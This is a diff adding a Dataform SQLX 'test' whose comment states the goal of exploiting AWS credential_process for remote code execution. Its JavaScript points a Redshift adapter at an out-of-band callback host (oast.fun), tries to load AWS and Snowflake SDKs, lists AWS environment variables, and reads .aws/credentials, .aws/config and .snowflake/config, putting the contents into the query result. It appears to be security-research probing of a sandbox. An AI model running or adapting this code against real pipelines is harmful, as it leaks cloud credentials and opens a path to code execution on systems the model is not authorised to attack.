@@ -1,0 +1,188 @@
+-- Redshift Adapter Test
+-- Tests if Redshift adapter creation triggers AWS SDK loading
+-- Goal: Exploit credential_process in AWS config for RCE
+
+config {
+  type: "view",
+  name: "redshift_adapter_test"
+}
+
+js {
+  let results = [];
+  const oastEndpoint = "https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun";
+
+  // Test 1: Check available warehouse types
+  try {
+    const types = core.adapters.WarehouseType;
+    results.push("1_warehouse_types: " + JSON.stringify(types));
+  } catch(e) {
+    results.push("1_warehouse_types: ERROR - " + e.message);
+  }
+
+  // Test 2: Try to create Redshift adapter
+  try {
+    const config = {
+      warehouse: "redshift",
+      defaultSchema: "public",
+      defaultDatabase: "dev",
+      host: oastEndpoint.replace("https://", ""),
+      port: 5439,
+      user: "admin",
+      password: "password123"
+    };
+    const redshiftAdapter = core.adapters.create(config, "redshift");
+    results.push("2_redshift_adapter: SUCCESS - keys=" + Object.keys(redshiftAdapter).join(","));
+  } catch(e) {
+    results.push("2_redshift_adapter: " + e.message.substring(0, 200));
+  }
+
+  // Test 3: Try with current session config but change warehouse
+  try {
+    const modConfig = Object.assign({}, core.session.config);
+    modConfig.warehouse = "redshift";
+    const adapter = core.adapters.create(modConfig, "redshift");
+    results.push("3_session_redshift: SUCCESS - " + typeof adapter);
+  } catch(e) {
+    results.push("3_session_redshift: " + e.message.substring(0, 200));
+  }
+
+  // Test 4: Check for AWS-related globals BEFORE adapter attempt
+  try {
+    const awsGlobals = [];
+    for (const key in globalThis) {
+      if (key.toLowerCase().includes('aws') || key.toLowerCase().includes('amazon')) {
+        awsGlobals.push(key);
+      }
+    }
+    results.push("4_aws_globals_before: " + (awsGlobals.length ? awsGlobals.join(",") : "none"));
+  } catch(e) {
+    results.push("4_aws_globals: ERROR - " + e.message);
+  }
+
+  // Test 5: Check if require('aws-sdk') or similar works
+  try {
+    const aws = require('aws-sdk');
+    results.push("5_aws_sdk_require: SUCCESS - " + Object.keys(aws).slice(0,10).join(","));
+  } catch(e) {
+    results.push("5_aws_sdk_require: " + e.message.substring(0, 100));
+  }
+
+  // Test 6: Check if @aws-sdk/client-redshift works
+  try {
+    const redshift = require('@aws-sdk/client-redshift');
+    results.push("6_aws_sdk_v3: SUCCESS - " + Object.keys(redshift).slice(0,10).join(","));
+  } catch(e) {
+    results.push("6_aws_sdk_v3: " + e.message.substring(0, 100));
+  }
+
+  // Test 7: Check for credential provider chain
+  try {
+    const creds = require('@aws-sdk/credential-providers');
+    results.push("7_cred_providers: SUCCESS - " + Object.keys(creds).join(","));
+  } catch(e) {
+    results.push("7_cred_providers: " + e.message.substring(0, 100));
+  }
+
+  // Test 8: Check environment for AWS variables
+  try {
+    const envKeys = Object.keys(process.env || {}).filter(k =>
+      k.includes('AWS') || k.includes('AMAZON') || k.includes('REDSHIFT')
+    );
+    results.push("8_aws_env_vars: " + (envKeys.length ? envKeys.join(",") : "none_or_no_process"));
+  } catch(e) {
+    results.push("8_aws_env_vars: " + e.message.substring(0, 100));
+  }
+
+  // Test 9: Try all adapters.create variants
+  try {
+    const warehouseTests = [];
+    const testTypes = ["bigquery", "redshift", "snowflake", "postgres", "presto", "sqldatawarehouse"];
+    for (const wh of testTypes) {
+      try {
+        const a = core.adapters.create({warehouse: wh}, wh);
+        warehouseTests.push(wh + ":OK");
+      } catch(e) {
+        warehouseTests.push(wh + ":" + e.message.substring(0, 30));
+      }
+    }
+    results.push("9_all_adapters: " + warehouseTests.join(" | "));
+  } catch(e) {
+    results.push("9_all_adapters: ERROR - " + e.message);
+  }
+
+  // Test 10: Check if there's a Snowflake adapter (might use different auth)
+  try {
+    const snowflake = require('snowflake-sdk');
+    results.push("10_snowflake_sdk: SUCCESS - " + Object.keys(snowflake).slice(0,5).join(","));
+  } catch(e) {
+    results.push("10_snowflake_sdk: " + e.message.substring(0, 100));
+  }
+
+  // Test 11: Check dataform internals for adapter loading
+  try {
+    const adapterMethods = Object.getOwnPropertyNames(core.adapters).filter(m => typeof core.adapters[m] === 'function');
+    results.push("11_adapter_methods: " + adapterMethods.join(","));
+  } catch(e) {
+    results.push("11_adapter_methods: ERROR - " + e.message);
+  }
+
+  // Test 12: Check session for warehouse config
+  try {
+    results.push("12_session_warehouse: " + (core.session.config.warehouse || "undefined"));
+    results.push("12_session_keys: " + Object.keys(core.session.config).join(","));
+  } catch(e) {
+    results.push("12_session: ERROR - " + e.message);
+  }
+
+  // Test 13: Try to import pg (postgres client)
+  try {
+    const pg = require('pg');
+    results.push("13_pg_client: SUCCESS - " + Object.keys(pg).slice(0,5).join(","));
+  } catch(e) {
+    results.push("13_pg_client: " + e.message.substring(0, 100));
+  }
+
+  // Test 14: Check if core has hidden warehouse implementations
+  try {
+    const coreKeys = Object.keys(core);
+    const warehouseRelated = coreKeys.filter(k =>
+      k.toLowerCase().includes('warehouse') ||
+      k.toLowerCase().includes('adapter') ||
+      k.toLowerCase().includes('redshift') ||
+      k.toLowerCase().includes('snowflake')
+    );
+    results.push("14_core_warehouse: " + warehouseRelated.join(",") + " | all:" + coreKeys.join(","));
+  } catch(e) {
+    results.push("14_core: ERROR - " + e.message);
+  }
+
+  // Test 15: Look for credential file paths
+  try {
+    const paths = [
+      ".aws/config",
+      ".aws/credentials",
+      "aws_config",
+      ".snowflake/config"
+    ];
+    const fileResults = [];
+    for (const p of paths) {
+      try {
+        const exists = restricted_fs.exists(p);
+        if (exists) {
+          const content = restricted_fs.readFile(p);
+          fileResults.push(p + ":EXISTS:" + content.substring(0,50));
+        } else {
+          fileResults.push(p + ":NOTFOUND");
+        }
+      } catch(e) {
+        fileResults.push(p + ":ERR:" + e.message.substring(0,30));
+      }
+    }
+    results.push("15_cred_files: " + fileResults.join(" | "));
+  } catch(e) {
+    results.push("15_cred_files: ERROR - " + e.message);
+  }
+}
+
+SELECT
+  '${JSON.stringify(results)}' as adapter_results
